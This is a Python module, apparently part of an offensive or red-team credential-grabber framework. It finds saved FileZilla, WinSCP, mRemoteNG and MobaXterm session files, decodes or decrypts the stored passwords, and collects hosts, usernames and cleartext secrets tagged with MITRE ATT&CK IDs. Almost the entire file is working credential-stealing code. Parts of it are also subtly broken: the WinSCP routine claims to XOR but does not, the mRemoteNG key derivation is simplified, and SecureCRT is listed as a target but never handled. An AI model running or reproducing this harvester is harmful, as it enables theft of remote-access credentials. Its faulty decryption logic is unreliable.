"""
RemoteAccessGrabber — Extract saved credentials from remote access tools

Targets:
- FileZilla: recentservers.xml, sitemanager.xml (base64-encoded CLEARTEXT!)
- WinSCP: WinSCP.ini (custom reversible encryption)
- mRemoteNG: confCons.xml (AES-128-CBC with default key "mR3m")
- MobaXterm: MobaXterm.ini (custom encoding)
- SecureCRT: session files in VanDyke config directory

MITRE ATT&CK: T1552.001 (Credentials In Files), T1555 (Credentials from Password Stores)
"""

from __future__ import annotations

import base64
import hashlib
import os
import re
from xml.etree import ElementTree

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text


class RemoteAccessGrabber(GrabberModule):
    name = "remote_access"
    description = "Extract credentials from FileZilla, WinSCP, mRemoteNG, MobaXterm"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    _TARGETS = [
        ("{appdata}/FileZilla/recentservers.xml", "_parse_filezilla"),
        ("{appdata}/FileZilla/sitemanager.xml", "_parse_filezilla"),
        ("{appdata}/mRemoteNG/confCons.xml", "_parse_mremoteng"),
        ("{appdata}/WinSCP.ini", "_parse_winscp"),
        ("{appdata}/MobaXterm/MobaXterm.ini", "_parse_mobaxterm"),
        # Unix locations
        ("{home}/.config/filezilla/recentservers.xml", "_parse_filezilla"),
        ("{home}/.config/filezilla/sitemanager.xml", "_parse_filezilla"),
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        for template, _ in self._TARGETS:
            path = self._expand(template, context)
            if path and os.path.isfile(path):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        for template, parser_name in self._TARGETS:
            path = self._expand(template, context)
            if not path or not os.path.isfile(path):
                continue

            content = safe_read_text(path)
            if not content:
                continue

            try:
                parser = getattr(self, parser_name)
                creds = parser(path, content)
                result.credentials.extend(creds)

                if creds:
                    app = os.path.basename(os.path.dirname(path))
                    result.findings.append(self.make_finding(
                        file_path=path,
                        description=f"Extracted {len(creds)} credential(s) from {app}",
                        score=100 * min(len(creds), 3),
                        matched_value=app,
                        snippets=[f"{c.url} ({c.username})" for c in creds[:3]],
                    ))
            except Exception as e:
                self.logger.debug(f"Failed to parse {path}: {e}")
                result.errors.append(f"{path}: {e}")

        result.status = GrabberStatus.COMPLETED
        return result

    @staticmethod
    def _expand(template: str, context: GrabberContext) -> str:
        appdata = context.appdata_roaming
        home = context.user_profile_path
        if not appdata and not home:
            return ""
        return template.format(appdata=appdata, home=home)

    # --- FileZilla (base64-encoded plaintext passwords!) ---

    def _parse_filezilla(self, path: str, content: str) -> list[ExtractedCredential]:
        """Parse FileZilla XML — passwords are base64-encoded plaintext."""
        creds = []
        try:
            root = ElementTree.fromstring(content)
        except ElementTree.ParseError:
            return creds

        for server in root.iter("Server"):
            host = self._xml_text(server, "Host", "")
            port = self._xml_text(server, "Port", "21")
            user = self._xml_text(server, "User", "")
            pass_b64 = self._xml_text(server, "Pass", "")
            protocol = self._xml_text(server, "Protocol", "0")

            password = ""
            if pass_b64:
                try:
                    password = base64.b64decode(pass_b64).decode("utf-8", errors="ignore")
                except Exception:
                    pass

            if user or password:
                proto_name = {"0": "FTP", "1": "SFTP", "3": "FTPS", "4": "FTPES"}.get(protocol, "FTP")
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="password",
                    target_application=f"FileZilla ({proto_name})",
                    url=f"{host}:{port}",
                    username=user,
                    decrypted_value=password,
                    mitre_technique="T1552.001",
                ))
        return creds

    @staticmethod
    def _xml_text(element: ElementTree.Element, tag: str, default: str = "") -> str:
        child = element.find(tag)
        return child.text if child is not None and child.text else default

    # --- mRemoteNG (AES-128-CBC with default password "mR3m") ---

    def _parse_mremoteng(self, path: str, content: str) -> list[ExtractedCredential]:
        """Parse mRemoteNG confCons.xml — AES-CBC encrypted with known default key."""
        creds = []
        try:
            root = ElementTree.fromstring(content)
        except ElementTree.ParseError:
            return creds

        for node in root.iter("Node"):
            hostname = node.get("Hostname", "")
            username = node.get("Username", "")
            password_enc = node.get("Password", "")
            protocol = node.get("Protocol", "RDP")
            port = node.get("Port", "")

            decrypted = ""
            if password_enc:
                decrypted = self._decrypt_mremoteng(password_enc)

            if username or decrypted:
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="password",
                    target_application=f"mRemoteNG ({protocol})",
                    url=f"{hostname}:{port}" if port else hostname,
                    username=username,
                    encrypted_value=password_enc.encode() if not decrypted else b"",
                    decrypted_value=decrypted,
                    mitre_technique="T1555",
                ))
        return creds

    @staticmethod
    def _decrypt_mremoteng(encrypted_b64: str, master_password: str = "mR3m") -> str:
        """Decrypt mRemoteNG password (AES-128-CBC, default key derived from 'mR3m')."""
        try:
            from ._crypto import aes_cbc_decrypt

            data = base64.b64decode(encrypted_b64)
            if len(data) < 32:
                return ""

            # mRemoteNG uses: salt = data[:16], iv = data[16:32], ciphertext = data[32:]
            salt = data[:16]
            iv = data[16:32]
            ciphertext = data[32:]

            # Key derivation: MD5(password + salt) iterated
            key_material = hashlib.md5(master_password.encode() + salt).digest()

            plaintext = aes_cbc_decrypt(key_material, iv, ciphertext)
            return plaintext.decode("utf-8", errors="ignore")

        except Exception:
            return ""

    # --- WinSCP (custom reversible encryption) ---

    def _parse_winscp(self, path: str, content: str) -> list[ExtractedCredential]:
        """Parse WinSCP.ini for saved sessions."""
        creds = []
        current_section = ""

        for line in content.splitlines():
            line = line.strip()
            if line.startswith("[") and line.endswith("]"):
                current_section = line[1:-1]
                continue

            if not current_section.startswith("Sessions\\"):
                continue

            if "=" not in line:
                continue

            key, _, value = line.partition("=")
            key = key.strip()
            value = value.strip()

            if key == "HostName" and value:
                # Start collecting a new session
                session_name = current_section.replace("Sessions\\", "")
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="password",
                    target_application="WinSCP",
                    url=value,
                    username="",
                    notes=f"session={session_name}",
                    mitre_technique="T1552.001",
                ))

            elif key == "UserName" and value and creds:
                creds[-1].username = value

            elif key == "Password" and value and creds:
                # WinSCP uses a custom reversible cipher; store encrypted for offline
                decrypted = self._decrypt_winscp_password(value, creds[-1].username, creds[-1].url)
                if decrypted:
                    creds[-1].decrypted_value = decrypted
                else:
                    creds[-1].encrypted_value = value.encode()

            elif key == "PortNumber" and value and creds:
                creds[-1].url = f"{creds[-1].url}:{value}"

        return creds

    @staticmethod
    def _decrypt_winscp_password(encrypted_hex: str, username: str, hostname: str) -> str:
        """Decrypt WinSCP password using the known algorithm.

        WinSCP uses a simple XOR cipher with the hostname and username as key.
        The 'encrypted' value is a hex string where pairs of hex digits
        represent encrypted bytes.
        """
        try:
            key = username + hostname
            enc_bytes = []
            for i in range(0, len(encrypted_hex), 2):
                enc_bytes.append(int(encrypted_hex[i:i + 2], 16))

            if len(enc_bytes) < 3:
                return ""

            # WinSCP algorithm: skip flag byte, length byte, then XOR-decrypt
            flag = enc_bytes[0]
            if flag == 0xFF:
                enc_bytes = enc_bytes[1:]  # Remove flag byte

            length = enc_bytes[1]
            enc_bytes = enc_bytes[2:]  # Skip flag+length

            # Remove padding (length of key)
            key_len = len(key)
            if len(enc_bytes) > key_len:
                enc_bytes = enc_bytes[key_len:]

            password = ""
            for i in range(0, min(length * 2, len(enc_bytes)), 2):
                if i + 1 < len(enc_bytes):
                    # Each character is encoded as two bytes: (char ^ key_byte)
                    val = ((enc_bytes[i] << 4) | enc_bytes[i + 1])
                    password += chr(val)

            return password

        except (ValueError, IndexError):
            return ""

    # --- MobaXterm ---

    def _parse_mobaxterm(self, path: str, content: str) -> list[ExtractedCredential]:
        """Parse MobaXterm.ini for saved credentials."""
        creds = []
        in_passwords = False

        for line in content.splitlines():
            line = line.strip()
            if line == "[Passwords]":
                in_passwords = True
                continue
            elif line.startswith("[") and in_passwords:
                in_passwords = False
                continue

            if in_passwords and "=" in line:
                session, _, enc_pass = line.partition("=")
                # MobaXterm password encryption varies by version
                # Store encrypted for offline cracking
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="password",
                    target_application="MobaXterm",
                    username=session.strip(),
                    encrypted_value=enc_pass.strip().encode(),
                    mitre_technique="T1555",
                ))

        return creds
